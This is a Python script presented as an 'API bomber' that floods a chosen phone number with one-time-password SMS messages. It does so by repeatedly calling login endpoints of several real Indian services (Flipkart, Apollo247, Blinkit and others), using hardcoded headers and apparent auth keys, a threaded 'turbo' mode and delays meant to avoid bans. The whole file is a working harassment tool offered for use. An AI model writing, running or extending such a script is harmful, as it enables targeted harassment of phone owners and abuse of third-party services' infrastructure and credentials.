import requests
import os
import time
import threading

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
C = "\033[96m" # Cyan
W = "\033[0m"  # White

success_count = 0
failed_count = 0

# --- 1. RESEARCHED API DATABASE ---
def get_apis(target):
    return [
        {"name": "Housing", "method": "POST", "url": "https://login.housing.com/api/v2/send-otp", "json": {"phone": target}},
        {"name": "ConfirmTkt", "method": "GET", "url": "https://securedapi.confirmtkt.com/api/platform/register", "params": {"newOtp": "true", "mobileNumber": target}},
        {"name": "Flipkart", "method": "POST", "url": "https://rome.api.flipkart.com/api/7/user/otp/generate", "json": {"loginId": "+91" + target}},
        
        {
            "name": "Mamaearth_Gokwik",
            "method": "POST",
            "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
            "json": {"phone": target, "country": "in", "country_code": "+91"},
            "headers": {"Gk-Merchant-Id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"}
        },
        {
            "name": "Apollo247",
            "method": "POST",
            "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
            "json": {"loginType": "PATIENT", "mobileNumber": "+91" + target},
            "headers": {"X-Apollo-Pre-Auth-Key": "d8e788e0-4c4c-4e8c-8c8c-4c4c4e8c8c8c", "Origin": "https://www.apollo247.com"}
        },
        {
            "name": "Blinkit",
            "method": "POST",
            "url": "https://blinkit.com/v1/user/otp/send",
            "json": {"phone": target},
            "headers": {"app_client": "consumer_web", "Origin": "https://blinkit.com"}
        },
        {
            "name": "Grofers",
            "method": "POST",
            "url": "https://grofers.com/v2/accounts/",
            "data": {"user_phone": target},
            "headers": {"auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"}
        }
    ]

# --- 2. SENDER FUNCTION ---
def send_otp(api, session, common_headers):
    global success_count, failed_count
    try:
        current_headers = common_headers.copy()
        if "headers" in api:
            current_headers.update(api["headers"])

        if api["method"] == "GET":
            res = session.get(api["url"], params=api.get("params"), headers=current_headers, timeout=10)
        else:
            res = session.post(api["url"], json=api.get("json"), data=api.get("data"), headers=current_headers, timeout=10)
        
        if res.status_code in [200, 201, 202]:
            success_count += 1
            print(f"{G}[+] SUCCESS: {api['name']}{W}")
        else:
            failed_count += 1
    except:
        failed_count += 1

# --- 3. MAIN UI & LOGIC ---
def main():
    os.system("clear")
    print(f"{C}========================================{W}")
    print(f"{G}      🚀 ADVANCE API BOMBER v20.0       {W}")
    print(f"{C}========================================{W}\n")
    
    # OLD STYLE INPUTS (ALAG-ALAG LINES)
    print(f"{Y}--- Enter Target Info ---{W}")
    target = input(f"{G}Enter Target Number: {W}")
    limit = input(f"{G}Enter SMS Limit    : {W}")
    
    print(f"\n{Y}--- Select Speed Mode ---{W}")
    print(f"{C}1. Serial Mode (Safe & Slow){W}")
    print(f"{C}2. Threading Mode (Fast/Turbo){W}")
    mode = input(f"{G}Choice: {W}")

    # Validations
    if not target or not limit:
        print(f"{R}\n[!] Error: Number ya Limit nahi dali!{W}")
        return
    
    limit = int(limit)
    common_headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }

    bot_session = requests.Session()
    print(f"\n{Y}[*] Attack Started on: {C}{target}{W}\n")
    
    sent = 0
    while sent < limit:
        apis = get_apis(target)
        
        if mode == "1":
            # Serial Mode
            for api in apis:
                if sent >= limit: break
                send_otp(api, bot_session, common_headers)
                sent += 1
                time.sleep(1)
        else:
            # Threading Mode
            threads = []
            for api in apis:
                if sent >= limit: break
                t = threading.Thread(target=send_otp, args=(api, bot_session, common_headers))
                t.start()
                threads.append(t)
                sent += 1
            for t in threads: t.join()
            time.sleep(2) # Ban protection

    print(f"\n{C}========================================{W}")
    print(f"{G}           ATTACK FINISHED             {W}")
    print(f"{C}========================================{W}")
    print(f"{G}Total Successful: {success_count}{W}")
    print(f"{R}Total Failed    : {failed_count}{W}")
    print(f"{C}========================================{W}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Attack Stopped by User.{W}")
